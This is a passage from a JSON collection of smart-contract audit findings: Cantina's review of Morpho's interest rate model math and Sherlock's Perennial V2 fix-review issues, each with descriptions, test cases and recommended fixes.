market[id].totalBorrowAssets.wMulDown(borrowRate.wTaylorCompounded(elapsed));\nmarket[id].totalBorrowAssets += interest.toUint128();\nmarket[id].totalSupplyAssets += interest.toUint128();\n```\nThe interest would need to fit within `uint128`. \n\n### Analysis of Total Borrow Assets\n- Let \\( AB \\) be the totalBorrowAssets.\n- Let \\( x \\) be \\( \\Delta t \\cdot \\bar{r} \\).\n- Let \\( \\Delta t \\) be the elapsed time.\n- Let \\( \\bar{r} \\) be the borrow rate or avgBorrowRate.\n\nAssuming \\( AB \\) is \\( 10^{18} \\), the maximum for \\( x \\) would be:\n\\[ 1.2686160381663402351225217 \\cdot 10^{7 + 18} \\]\n\nThe requirement can be made even more strict as interests are accumulated into \\( AB \\) (and also as totalSupplyAssets):\n\\[ AB \\cdot 10^{18} \\cdot \\left( \\frac{10^{18} + x + \\frac{x^2}{2!} \\cdot 10^{18} + \\frac{x^3}{3!} \\cdot 10^{36}}{10^{18}} \\right) \\leq 2^{128} - 1 \\]\n\nThis may also influence the value selected for `MAX_RATE`, which is used to clip the returned average borrow rate.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54435",
      "title": "Check invariants and add unit tests for wExp(x) ",
      "impact": "LOW",
      "content": "## Context: MathLib.sol#L23-L46\n\n## Description/Recommendation\n\n### Check invariants and add unit tests for `wExp(x)`:\n\n- [ ] Add unit test to ensure that `wExp(q * LN2_INT) == WAD_INT << q` for non-negative `q`.\n- [ ] Add unit test to verify that `wMulDown(wExp(x), wExp(-x))` is approximately `WAD`, ensuring:\n  - \\( f(x)f(-x) = 1 \\)\n\n### From shared internal documents regarding the jump factor:\n\nThis way, one cannot manipulate the rate by supplying a huge amount and withdrawing right after.\n\n- [ ] Prove and add unit test to verify that `wExp(x) >= 0`.\n- [ ] Check whether \\( \\max(0, WAD + x) \\leq wExp(x) \\)",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54434",
      "title": "First err of a market anchors the range of errDelta and JumpMultiplier ",
      "impact": "LOW",
      "content": "## SpeedJumpIrm Overview\n\n## Context\n`SpeedJumpIrm.sol#L122`\n\n## Description\nThe `SpeedJumpIrm` calculates the interest rate based on `SpeedFactor` and `JumpFactor`. According to the document, at any time \\( t \\), the level of the rate is given by the formula:\n\n\\( r(t) = r(last(t)) \\ast jump(t) \\ast speed(t) \\)\n\nTo avoid the manipulation risks (notion document), the jump function is chosen this way to prevent manipulation, as follows:\n\n\\[\n\\forall e, k\\Delta(e) \\quad D \\ast k\\Delta(-e) \\quad D = 1\n\\]\n\nIn the `SpeedJumpIrm` implementation, the jump factor is defined by the following formula, where the interest rate depends on the `errDelta`:\n\n```solidity\njumpMultiplier = MathLib.wExp(errDelta.wMulDown(int256(LN_JUMP_FACTOR)));\n```\n\nSince \\( errDelta = err - marketIrm[id].prevErr \\) and \\( -1 < err < 1 \\), the first `err` to be recorded would set the range of `JumpMultiplier`.\n\n## Scenarios\nAssume two scenarios where the market stabilizes at the target utilization rate.\n\n### Case 1\n- **Condition**: The first `err` to be recorded is 1, and the market stabilizes at the target utilization rate, and `err` is 0. \n- **Implication**: \n  - \\( jumpMultiplier = JumpFactor^{-1} \\)\n  - \\( JumpFactor_{0} > jumpMultiplier > JumpFactor_{-2} \\), assume \\( JumpFactor > 1 \\).\n\n### Case 2\n- **Condition**: The first `err` to be recorded is -1, and the market stabilizes at the target utilization rate, and `err` is 0.\n- **Implication**: \n  - \\( jumpMultiplier = JumpFactor^{1} \\)\n  - \\( JumpFactor_{2} > jumpMultiplier > JumpFactor_{0} \\), assume \\( JumpFactor > 1 \\).\n\nSince the jump factor would have a bigger impact on markets in the early days of the protocol, allowing the first `err` to significantly impact the jump factor would complicate parameter tuning.\n\n## Recommendation\nConsider setting the first `err` at zero and adjusting the parameters accordingly.\n\n```solidity\nif (marketIrm[id].prevBorrowRate == 0) return (err, INITIAL_RATE, INITIAL_RATE);\n```\n\nChange to:\n```solidity\nif (marketIrm[id].prevBorrowRate == 0) return (0, INITIAL_RATE, INITIAL_RATE);\n```\n\nWe can also rewrite the `JumpFactor` to always depend on `err` instead of `errDelta`. This change would have the same effect with less complexity. The only difference is that the `errDelta` would not be clipped by `MIN_RATE` or `MAX_RATE`.\n\n```solidity\njumpMultiplier = MathLib.wExp(err.wMulDown(int256(LN_JUMP_FACTOR)));\n```\n\n## Morpho\nFixed in PR 54.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54433",
      "title": "avgBorrowRate is miscalculated as zero when newBorrowRate equals to borrowRateAfterJump ",
      "impact": "MEDIUM",
      "content": "## SpeedJumpIrm.sol Overview\n\n## Context\n**File:** SpeedJumpIrm.sol  \n**Line:** 147\n\n## Description\nThe `SpeedJumpIrm` calculates the interest rate based on `SpeedFactor` and `JumpFactor`. According to the document, at any time `t`, the level of the rate is given by the formula:\n\n\\[ r(t) = r(last(t)) \\times jump(t) \\times speed(t) \\]\n\nFor Morpho blue to calculate the interests during two interactions of IRM, the `SpeedJumpIrm` calculates the `avgBorrowRate` as \n\n\\[ \\text{uint256}\\left(\\left(\\text{int256(newBorrowRate)} - \\text{int256(borrowRateAfterJump)}\\right).\\text{wDivDown(linearVariation)}\\right) \\]\n\nHere, `borrowRateAfterJump` is the interest rate applied by the `JumpFactor` and `newBorrowRate` is the end interest rate applied by both `SpeedFactor` and `JumpFactor`.\n\nIn the `SpeedJumpIrm` implementation, two variables are calculated as follows:\n\n- **Lines 134-139 in SpeedJumpIrm.sol:**\n    ```solidity\n    int256 linearVariation = speed * int256(elapsed);\n    uint256 variationMultiplier = MathLib.wExp(linearVariation);\n    // newBorrowRate = prevBorrowRate * jumpMultiplier * variationMultiplier.\n    uint256 borrowRateAfterJump = marketIrm[id].prevBorrowRate.wMulDown(jumpMultiplier);\n    uint256 newBorrowRate = borrowRateAfterJump.wMulDown(variationMultiplier);\n    ```\n\n- ...\n    ```solidity\n    uint256 avgBorrowRate;\n    if (linearVariation == 0) \n        avgBorrowRate = borrowRateAfterJump; // Safe \"unchecked\" cast to uint256 because linearVariation < 0 <=> newBorrowRate <= borrowRateAfterJump\n    else \n        avgBorrowRate = uint256((int256(newBorrowRate) - int256(borrowRateAfterJump)).wDivDown(linearVariation));\n    ```\n\nSince the `speed` variable depends on the error of the current utilization rate and the target utilization rate, it can yield very small results, resulting in `linearVariation` being very small or zero. Thus, in the implementation, `avgBorrowRate` is returned as `borrowRateAfterJump` when `linearVariation` is zero.\n\nHowever, there's an edge case when `linearVariation` is small but not zero. In this case, `borrowRateAfterJump.wMulDown(variationMultiplier)` equals `borrowRateAfterJump` because of rounding down, resulting in the wrong `avgBorrowRate` at `SpeedJumpIrm.sol#L149` since:\n\n\\[ linearVariation = 0 \\]\n\n## Recommendation\nThis issue is closely related to the issue \"avgBorrowRate can blow-up for small linearVariation\". Both describe the approximation error when `linearVariation` is small. \n\nIt is recommended to use a simpler formula to approximate the average borrow rate when `linearVariation` is small. The recommended mitigation of \"avgBorrowRate can blow-up for small linearVariation\" works in two cases.",
      "summary": "\nThis bug report is about an issue in the `SpeedJumpIrm.sol` file on line 147. The `SpeedJumpIrm` calculates the interest rate using two factors, `SpeedFactor` and `JumpFactor`. However, there is a problem when `linearVariation` is small but not zero, resulting in an incorrect `avgBorrowRate` being returned. This issue is related to another issue called \"avgBorrowRate can blow-up for small linearVariation\". To fix this, the report recommends using a simpler formula to calculate the average borrow rate when `linearVariation` is small.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54432",
      "title": "Incorrect upper bound check in wExp(x) can produce an overowed result ",
      "impact": "HIGH",
      "content": "## Context: MathLib.sol#L26\n\n## Description\nUpper-bound used in `wExp(x)` is not restrict enough:\n\n```solidity\n// Revert if x > ln(2^256-1) ~ 177.\nrequire(x <= 177.44567822334599921 ether, ErrorsLib.WEXP_OVERFLOW);\n```\n\nAs this function accepts `x` in the 18 decimal format and is supposed to return an 18 decimal number, the upper bound should be calculated similarly to Remco's `FixedPointMathLib`:\n\n\\[\n10^{18} e^{x + \\epsilon} \\leq 10^{18} e^{x + \\epsilon} 10^{18} \\leq 2^{256} - 1\n\\]\n\nSo:\n\n\\[\nx \\leq \\frac{10^{18} \\ln(2^{256} - 1)}{10^{18}} - \\epsilon\n\\]\n\nHere \\(\\epsilon = \\text{LN2\\_INT}\\).\n\nAnd so the upper bound would be approximately:\n\n\\[\n135.305999368893231588 \\text{ ether}:\n\\]\n\n\\[\n135.305999368893231588 \\cdot 10^{18} = \\frac{10^{18} \\ln(2^{256} - 1)}{10^{18}} - 10^{18} \\ln(2)\n\\]\n\nThis is a rough estimate as the actual implementation uses the 2nd order Taylor expansion of the `exp` function. A less strict upper bound would be:\n\n\\[\n135.652572959173204244 \\text{ ether}.\n\\]\n\nUsing binary search, one can find the exact value for the upper bound (below the unit is ether):\n\n- \\(136.549994570309225873 < 197 \\cdot \\text{LN2}\\) - overflows\n- \\(135.999582271169154766\\) overflows\n- \\(135.999582271169154765\\) does not overflow\n- \\(135.856847389749280564 < 196 \\cdot \\text{LN2}\\)\n- \\(135.652572959173204244\\) approximate (\\(\\epsilon \\text{LN2\\_HALF}\\))\n- \\(135.305999368893231589\\) Remco's limit\n- \\(135.305999368893231588\\) approximate (\\(\\epsilon \\text{LN2}\\))\n\n## Test Case for MathLibTest.sol\n```solidity\nfunction testWExpSpecial() public {\n    console2.log(\"e(x0): \", MathLib.wExp(135.999582271169154765 ether));\n    console2.log(\"e(x1): \", MathLib.wExp(135.999582271169154766 ether));\n    console2.log(\"e(x2): \", MathLib.wExp(135.999582271169154767 ether));\n}\n```\n\n### Logs (note that `x0 < x1 < x2`):\n- `e(x0): 115792089237316195323137357242501015631897353894317901381819896896488577433600`\n- `e(x1): 0`\n- `e(x2): 100433627766186892221372630771322662657637687111424552206336`\n\n## Recommendation\nUpdate the upper bound limit check to a value to avoid the overflow issues. If a specific value is chosen, document why and produce a proof that overflows would not happen for the values below that limit. One can use one of the approximate values from above to be more conservative or a rounded bound \\(196 \\cdot \\text{LN2}\\).\n\nNote the exact bounds are implementation-dependent, but the more approximate ones should work for all implementations as long as the `wExp` returns a smaller value compared to the expected one.\n\n## Morpho\nFixed in PR 62.",
      "summary": "\nThe bug report is about an issue in a function called `wExp(x)` in the `MathLib.sol` code. The problem is that the upper bound used in this function is not strict enough, which can cause an overflow. The report suggests that the upper bound should be calculated in a similar way to another function called `FixedPointMathLib`. The report also provides some calculations and values for the upper bound, as well as a test case that shows the problem. The recommendation is to update the upper bound limit check to avoid the overflow issue. The bug has been fixed in a pull request (PR). ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "54431",
      "title": "avgBorrowRate can blow-up for small linearVariation ",
      "impact": "HIGH",
      "content": "## SpeedJumpIrm.sol Analysis\n\n## Context\nLocation: `SpeedJumpIrm.sol#L149`\n\n## Description\nFor small values of `linearVariation`, the average borrow rate calculated has a significant error which causes the result to deviate from the expected value. These errors stem from amplified division errors when divided by `linearVariation`.\n\nThe exponential function has a property that for small `x` (the terms/operations below are not in WAD):\n\n\\[\n\\frac{e^x - 1}{x} \\approx 1 + x\n\\]\n\nThe `wExp(x)` defined in `MathLib` has the following property for small `x` (up to division errors):\n\n\\[\n|x| < \\text{LN2\\_INT}\n\\]\n\\[\nwExp (x) - \\frac{10^{18}}{x} \\cdot 10^{18} = 10^{18} + x\n\\]\n\nThis is due to the fact that \n\n\\[\nq = \\frac{x + \\text{roundingAdjustment}}{\\text{LN2\\_INT}} = 0.\n\\]\n\n## Analysis of `avgBorrowRate` Calculation\n\nLet's analyze the calculation of `avgBorrowRate` for small non-zero `linearVariation`:\n\n| Parameter               | Description                                                                    |\n|-------------------------|--------------------------------------------------------------------------------|\n| `ravg`                  | Average borrow rate                                                            |\n| `rn`                    | New borrow rate, \\( rn = \\frac{A \\cdot V}{10^{18} - \\epsilon_0} \\)           |\n| `rn-1`                  | `marketIrm[id].prevBorrowRate`                                               |\n| `A`                     | `borrowRateAfterJump`, \\( A = \\frac{J \\cdot rn-1}{x} \\)                    |\n| `x`                     | `linearVariation`                                                              |\n| `J`                     | `jumpMultiplier`                                                              |\n| `V`                     | `variationMultiplier`                                                          |\n| \\(\\epsilon_2\\)         | \\(\\frac{x^2}{2 \\cdot 10^{18}} - \\left\\lfloor \\frac{x^2}{10^{18}} \\right\\rfloor\\), \\(\\epsilon_2 \\in [0, 3)\\) |\n| \\(\\epsilon_0\\)         | \\(\\frac{A \\cdot V}{10^{18}} - \\frac{A \\cdot V}{10^{18}} \\), \\(\\epsilon_0 \\in [0, 1)\\) |\n| \\(\\epsilon_3\\)         | \\(\\frac{x}{2} - \\frac{x}{x} \\), \\(\\epsilon_3 \\in [0, 1)\\)                   |\n| \\(\\epsilon_4\\)         | \\(\\left\\{ A \\left(10^{18} + \\frac{x}{10}\\right) \\right\\} \\), \\(\\epsilon_4 \\in [0, 1)\\) |\n\n#### `V` Calculation\n\\[\nV = wExp (x) = 10^{18} + x + \\frac{x^2}{2 \\cdot 10^{18}} - \\epsilon_2\n\\]\n\n#### `ravg` Calculation\n\\[\nravg = \\frac{rn - A}{x \\cdot 10^{18}} = \\frac{A \\cdot V}{10^{18} - \\epsilon_0 - A \\cdot \\frac{x}{10^{18}}}\n\\]\n\\[\n= A \\left( \\frac{10^{18} + x + \\frac{x^2}{2 \\cdot 10^{18}}}{10^{18} - \\epsilon_0 - A \\cdot \\frac{x}{10^{18}}} \\right)\n\\]\n\\[\n\\approx \\frac{A(10^{18} + x)}{10^{18} - \\epsilon_0 + A \\cdot \\frac{\\epsilon_2}{x}}\n\\]\nThus, as \\(x\\) approaches 0, `E` becomes significant:\n\n\\[\nE = \\frac{\\epsilon_4 + A\\epsilon_3}{10^{18} - A\\epsilon_2 + 10^{18}\\epsilon_0}{x}\n\\]\n\nThen:\n\\[\nravg = wMulDown\\left(A, 10^{18} + \\frac{x}{10}\\right) + E\n\\]\n\n### Recommendation for Small Values\nWhen `x` is small:\n\\[\n|x| < \\text{LN2\\_INT}\n\\]\n\nCalculate `ravg` as:\n\\[\nravg = \\text{mulDivDown}\\left(A, 2 \\cdot 10^{18} + x, 2 \\cdot 10^{18}\\right)\n\\]\n\n### Proof of Concept\n```solidity\nfunction testBorrowRateCase1() public {\n    Market memory market0;\n    market0.totalBorrowAssets = 200 ether;\n    market0.totalSupplyAssets = 1_000 ether;\n    market0.lastUpdate = uint128(block.timestamp);\n    uint256 avgBorrowRate = irm.borrowRate(marketParams, market0);\n    market0.totalBorrowAssets = 800 ether - 10000000000;\n    \n    uint timestamp = block.timestamp;\n    market0.lastUpdate = uint128(timestamp);\n    timestamp += 12;\n    vm.warp(timestamp);\n    vm.roll(block.number + 1);\n    \n    (uint256 prevBorrowRate,) = irm.marketIrm(marketParams.id());\n    console2.log(\"prevBorrowRate:\", prevBorrowRate);\n    \n    avgBorrowRate = irm.borrowRateView(marketParams, market0);\n    console2.log(\"avgBorrowRate:\", avgBorrowRate);\n}\n```\n\n### Output\n- `prevBorrowRate`: 317097919\n- `err`: -12500000\n- `errDelta`: 749999999987500000 ~ 0.7xxx ethers\n- `speed`: -3\n- `linearVariation`: -36\n- `jumpMultiplier`: 1683454723075656906 ~ 1.6xxx ethers\n- `variationMultiplier`: 999999999999999964 ~ WAD which makes sense and acts as 1\n- `borrowRateAfterJump`: 533819989\n- `newBorrowRate`: 533819988\n- `avgBorrowRate`: 27777777777777777\n- `newBorrowRate - borrowRateAfterJump`: -1\n- `avgBorrowRate`: \\((-1 \\cdot WAD) / (-36) = 27777777777777777 \\sim 0.0277... \\text{ ethers}\\)\n\n### Implementation Note\nIn Solidity, the implementation might look like this:\n```solidity\nif (\n    (-LN2_INT / 2 < linearVariation) &&\n    ( LN2_INT / 2 > linearVariation)\n) {\n    avgBorrowRate = MorphoMathLib.mulDivDown(borrowRateAfterJump, uint256(int256(2 * WAD) + linearVariation), 2 * WAD);,\n} else {\n    avgBorrowRate = uint256((int256(newBorrowRate) - int256(borrowRateAfterJump)).wDivDown(linearVariation));\n}\n```\n**Note**: `borrowRateAfterJump` should always be non-negative, and the cast `uint256(int256(2 * WAD) + linearVariation)` should be safe since \\(|x| < \\text{LN2\\_INT} < 10^{18}\\).",
      "summary": "\nThe report discusses a bug in the code for the SpeedJumpIrm contract, specifically in the calculation of the average borrow rate. When the variable \"linearVariation\" is small, the calculated rate has a significant error due to division errors. This is because the code uses an approximation for the exponential function, which is only accurate for larger values of \"x\". The report recommends a different calculation for small values of \"x\" to avoid these errors. A proof of concept is provided, along with an implementation note for fixing the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_blue_irm_oct2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-mon and Natalie",
        "Jonah Wu",
        "StErMi"
      ]
    },
    {
      "id": "26489",
      "title": "M-7: [Perennial Self Review] Incorrect price used during liquidation calculation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-09-perennial-judging/issues/59 \n\n## Found by \nProtocol Team\nFixed by https://github.com/equilibria-xyz/perennial-v2/pull/108\n\n\n\n## Discussion\n\n**panprog**\n\nFixed but when combined with #9, the liquidation will revert due to the fix (#9 will make oracle.latest().price = 0 and this will be used by the fix, while the correct `Market` process will use the latest valid oracle price in this case). The probability of this situation is very low, but still possible.\n\n**kbrizzle**\n\nNoted: we made this intentional decision since liquidations are generally predicated on posting a valid non-requested price anyways.\n\n**jacksanford1**\n\nBased on @kbrizzle's comment, Sherlock will consider this issue as acknowledged due to a very low but still possible potential for reverting.",
      "summary": "\nThis bug report is about an issue found by the Protocol Team related to incorrect price used during liquidation calculation in Perennial Self Review. The fix for this issue was provided by https://github.com/equilibria-xyz/perennial-v2/pull/108. However, when combined with another issue, the liquidation can revert due to the fix. Sherlock acknowledged this issue, considering the very low but still possible potential for reverting.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Fix Review",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-09-perennial-judging/issues/59",
      "tags": [],
      "finders": [
        "Protocol Team"
      ]
    },
    {
      "id": "26488",
      "title": "M-6: Invalid oracle version can cause the vault to open too large and risky position and get liquidated due to using unadjusted global current position",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-09-perennial-judging/issues/55 \n\n## Found by \npanprog\n\nThe fix to [issue 49 of the main contest](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/49) introduced new invalidation system, which stores invalidation accumulator for all positions. This means that `market.pendingPosition()` returns unadjusted global position which might be completely wrong.\n\nThe problem is that `Vault` (`StrategyLib`) uses `market.pendingPosition(global.currentId)` without adjusting it, which leads to incorrect current global position right after invalid oracle version (which creates different invalidation values for latest and current positions). This incorrect global position can lead to inflated position limits enforced in the market and vault opening too large risky position with very high leverage, which might liquidate the vault leading to loss of funds for vault users.\n\n## Vulnerability Detail\n\n`StrategyLib._loadContext` for the market loads `currentPosition` as:\n```solidity\ncontext.currentPosition = registration.market.pendingPosition(global.currentId);\n```\n\nHowever, this is unadjusted position, so its value is incorrect if invalid oracle version happens while this position is pending.\n\nLater on, when calculating minimum and maxmium positions enforced by the vault in the market, they're calculated in `_positionLimit`:\n```solidity\nfunction _positionLimit(MarketContext memory context) private pure returns (UFixed6, UFixed6) {\n    return (\n        // minimum position size before crossing the net position\n        context.currentAccountPosition.maker.sub(\n            context.currentPosition.maker\n                .sub(context.currentPosition.net().min(context.currentPosition.maker))\n                .min(context.currentAccountPosition.maker)\n                .min(context.closable)\n        ),\n        // maximum position size before crossing the maker limit\n        context.currentAccountPosition.maker.add(\n            context.riskParameter.makerLimit\n                .sub(context.currentPosition.maker.min(context.riskParameter.makerLimit))\n        )\n    );\n}\n```\n\nAnd the target maker size for the market is set in `allocate`:\n```solidity\n(targets[marketId].collateral, targets[marketId].position) = (\n    Fixed6Lib.from(_locals.marketCollateral).sub(contexts[marketId].local.collateral),\n    _locals.marketAssets\n        .muldiv(registrations[marketId].leverage, contexts[marketId].latestPrice.abs())\n        .min(_locals.maxPosition)\n        .max(_locals.minPosition)\n);\n```\n\nSince `context.currentPosition` is incorrect, it can happen that both `_locals.minPosition` and `_locals.maxPosition` are too high, the vault will open too large and risky position, breaking its risk limit and possibly getting liquidated, especially if it happens during high volatility.\n\n## Impact\n\nIf invalid oracle version happens, the vault might open too large and risky position in such market, potentially getting liquidated and vault users losing funds due to this liquidation.\n\n## Code Snippet\n\n`StrategyLib._loadContext` loads current global position without adjusting it, meaning `context.currentPosition` is incorrect if invalid oracle version happens:\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L131\n\nThis leads to incorrect position limit calculations:\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L172-L187\n\nThis, in turn, leads to incorrect target vault's position calculation for the market:\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L93-L99\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdjust global current position after loading it:\n```solidity\n    context.currentPosition = registration.market.pendingPosition(global.currentId);\n+   context.currentPosition.adjust(registration.market.position());\n```\n\n\n\n## Discussion\n\n**kbrizzle**\n\nFixed in: https://github.com/equilibria-xyz/perennial-v2/pull/109.\n\nPlease note there were additional pending positions that required adjustment.\n\n**panprog**\n\nFixed",
      "summary": "\nThis bug report is about an issue with the Vault (StrategyLib) in the Perennial Protocol, which can cause the vault to open too large and risky positions and get liquidated due to using an unadjusted global current position. The issue was found by panprog and the source of the bug can be found on Github.\n\nThe problem is that the Vault uses market.pendingPosition(global.currentId) without adjusting it, which leads to an incorrect current global position right after an invalid oracle version. This incorrect global position can lead to inflated position limits enforced in the market and a vault opening too large of a risky position with very high leverage, which can lead to the vault being liquidated and the users losing funds.\n\nThe code snippet in the bug report explains how the bug works and the impact of the bug is that if an invalid oracle version happens, the vault might open too large and risky positions in the market, potentially getting liquidated and vault users losing funds due to the liquidation.\n\nThe recommendation to fix the bug is to adjust the global current position after loading it. The bug has been fixed in a Github pull request and additional pending positions needed to be adjusted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Fix Review",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-09-perennial-judging/issues/55",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "26487",
      "title": "M-5: MultiInvoker liquidation action will revert due to incorrect closable amount calculation for invalid oracle versions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-09-perennial-judging/issues/45 \n\n## Found by \npanprog\n\nThe fix to [issue 49 of the main contest](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/49) introduced new invalidation system and additional condition: liquidations must close maximum `closable` amount, which is the amount which can be maximally closed based on the latest settled position.\n\nThe problem is that `MultiInvoker` incorrectly calculates `closableAmount` when settling invalid oracle positions and thus `LIQUIDATION` actions will revert in these cases.\n\n## Vulnerability Detail\n\n`MultiInvoker` calculates the `closable` amount in its `_latest` function. This function basically repeats the logic of `Market._settle`, but fails to repeat it correctly for the invalid oracle version settlement. When invalid oracle version is settled, `latestPosition` invalidation should increment, but the `latestPosition` should remain the same. This is achieved in the `Market._processPositionLocal` by adjusting `newPosition` after invalidation before the `latestPosition` is set to `newPosition`:\n```solidity\nif (!version.valid) context.latestPosition.local.invalidate(newPosition);\nnewPosition.adjust(context.latestPosition.local);\n...\ncontext.latestPosition.local.update(newPosition);\n```\n\nHowever, `MultiInvoker` doesn't adjust the new position and simply sets `latestPosition` to new position both when oracle is valid or invalid:\n```solidity\nif (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\nlatestPosition.update(pendingPosition);\n```\n\nThis leads to incorrect value of `closableAmount` afterwards:\n```solidity\npreviousMagnitude = latestPosition.magnitude();\nclosableAmount = previousMagnitude;\n```\n\nFor example, if `latestPosition.market = 10`, `pendingPosition.market = 0` and pendingPosition has invalid oracle, then:\n- `Market` will invalidate (`latestPosition.invalidation.market = 10`), adjust (`pendingPosition.market = 10`), set `latestPosition` to new `pendingPosition` (`latestPosition.maker = pendingPosition.maker = 10`), so `latestPosition.maker` correctly remains 10.\n- `MultiInvoker` will invalidate (`latestPosition.invalidation.market = 10`), and immediately set `latestPosition` to `pendingPosition` (`latestPosition.maker = pendingPosition.maker = 0`), so `latestPosition.maker` is set to 0 incorrectly.\n\nSince `LIQUIDATE` action of `MultiInvoker` uses `_latest` to calculate `closableAmount` and `liquidationFee`, these values will be calculated incorrectly and will revert when trying to update the market. See the `_liquidate` market update reducing `currentPosition` by `closable` (which is 0 when it must be bigger):\n```solidity\nmarket.update(\n    account,\n    currentPosition.maker.isZero() ? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n    currentPosition.long.isZero() ? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n    currentPosition.short.isZero() ? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n    Fixed6Lib.from(-1, liquidationFee),\n    true\n);\n```\n\nThis line will revert because `Market._invariant` verifies that `closableAmount` must be 0 after updating liquidated position:\n```solidity\nif (protected && (\n@@@ !closableAmount.isZero() ||\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        collateralAfterFees.sub(collateral)\n    ) ||\n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) revert MarketInvalidProtectionError();\n```\n\n## Impact\n\nIf there is an invalid oracle version during pending position settlement in `MultiInvoker` liquidation action, it will incorrectly revert and will cause loss of funds for the liquidator who should have received liquidation fee, but reverts instead.\n\nSince this breaks important `MultiInvoker` functionality in some rare edge cases (invalid oracle version, user has unsettled position which should settle during user liquidation with `LIQUIDATION` action of `MultiInvoker`), this should be a valid medium finding.\n\n## Code Snippet\n\nLatest position is calculated incorrectly in `MultiInvoker`:\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L388-L389\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nBoth `Market` and `MultiInvoker` handle position settlement for invalid oracle versions incorrectly (`Market` issue with this was reported separately as it's completely different), so both should be fixed and the fix of this one will depend on how the `Market` bug is fixed. The way it is, `MultiInvoker` correctly adjusts pending position before invalidating `latestPosition` (which `Market` fails to do), however after such action `pendingPosition` must not be adjusted, because it was already adjusted and new adjustment should only change it by the difference from the last invalidation. The easier solution would be just not to change `latestPosition` in case of invalid oracle version, so the fix might be like this (just add `else`):\n```solidity\n    if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n    else latestPosition.update(pendingPosition);\n```\n\nHowever, if the `Market` bug is fixed the way I proposed it (by changing `invalidate` function to take into account difference in invalidation of `latestPosition` and `pendingPosition`), then this fix will still be incorrect, because invalidate will expect unadjusted `pendingPosition`, so in this case `pendingPosition` should not be adjusted after loading it, but it will have to be adjusted for positions not yet settled. So the fix might look like this:\n```solidity\n    Position memory pendingPosition = market.pendingPositions(account, id);\n-   pendingPosition.adjust(latestPosition);\n\n    // load oracle version for that position\n    OracleVersion memory oracleVersion = market.oracle().at(pendingPosition.timestamp);\n    if (address(payoff) != address(0)) oracleVersion.price = payoff.payoff(oracleVersion.price);\n\n    // virtual settlement\n    if (pendingPosition.timestamp <= latestTimestamp) {\n        if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n-        latestPosition.update(pendingPosition);\n+       else {\n+           pendingPosition.adjust(latestPosition);\n+           latestPosition.update(pendingPosition);\n+       }\n        if (oracleVersion.valid) latestPrice = oracleVersion.price;\n\n        previousMagnitude = latestPosition.magnitude();\n        closableAmount = previousMagnitude;\n\n    // process pending positions\n    } else {\n+       pendingPosition.adjust(latestPosition);\n        closableAmount = closableAmount\n            .sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n        previousMagnitude = latestPosition.magnitude();\n    